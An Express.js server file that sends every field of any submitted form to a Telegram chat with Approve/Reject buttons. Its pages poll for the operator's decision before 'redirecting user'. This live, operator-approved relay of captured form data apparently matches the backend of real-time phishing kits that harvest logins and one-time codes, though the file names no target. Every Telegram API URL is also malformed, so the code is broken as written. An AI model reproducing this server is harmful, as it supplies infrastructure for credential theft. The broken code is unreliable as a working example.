import express from 'express';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Store pending approval states in memory
const sessions = new Map();
let lastUpdateId = 0;

// Poll Telegram for Approve/Reject button clicks every 2 seconds
async function pollTelegramCallbacks() {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) return;

  try {
    const res = await fetch(
      `https://telegram.org{token}/getUpdates?offset=${lastUpdateId + 1}&timeout=1`
    );
    const data = await res.json();

    if (data.ok && Array.isArray(data.result)) {
      for (const update of data.result) {
        lastUpdateId = update.update_id;

        if (update.callback_query) {
          const cb = update.callback_query;
          const [action, sessionId] = cb.data.split(':');

          if (sessions.has(sessionId)) {
            sessions.set(sessionId, action); // 'approved' or 'rejected'
          }

          // Remove loading spinner on the Telegram button
          await fetch(`https://telegram.org{token}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              callback_query_id: cb.id,
              text: action === 'approved' ? 'Approved! Redirecting user...' : 'Rejected!'
            })
          });

          // Update the Telegram message text to show the decision
          await fetch(`https://telegram.org{token}/editMessageReplyMarkup`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: cb.message.chat.id,
              message_id: cb.message.message_id,
              reply_markup: { inline_keyboard: [] }
            })
          });
        }
      }
    }
  } catch (err) {
    console.error('Polling error:', err.message);
  }
}

setInterval(pollTelegramCallbacks, 2000);

// Receive form submission and send Approve/Reject buttons to Telegram
app.post('/submit', async (req, res) => {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    return res.status(500).json({ success: false, message: 'Missing Telegram credentials' });
  }

  const sessionId = Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
  sessions.set(sessionId, 'pending');

  const fields = Object.entries(req.body)
    .map(([key, value]) => `${key}: ${value}`)
    .join('\n');

  try {
    const response = await fetch(`https://telegram.org{token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: `New Submission (ID: ${sessionId}):\n\n${fields}`,
        reply_markup: {
          inline_keyboard: [
            [
              { text: '✅ Approve', callback_data: `approved:${sessionId}` },
              { text: '❌ Reject', callback_data: `rejected:${sessionId}` }
            ]
          ]
        }
      })
    });

    const data = await response.json();
    if (!data.ok) {
      return res.status(502).json({ success: false, message: data.description });
    }

    res.status(200).json({ success: true, sessionId });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Endpoint for HTML pages to check if admin approved or rejected
app.get('/status/:sessionId', (req, res) => {
  const status = sessions.get(req.params.sessionId) || 'not_found';
  res.json({ status });
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
        
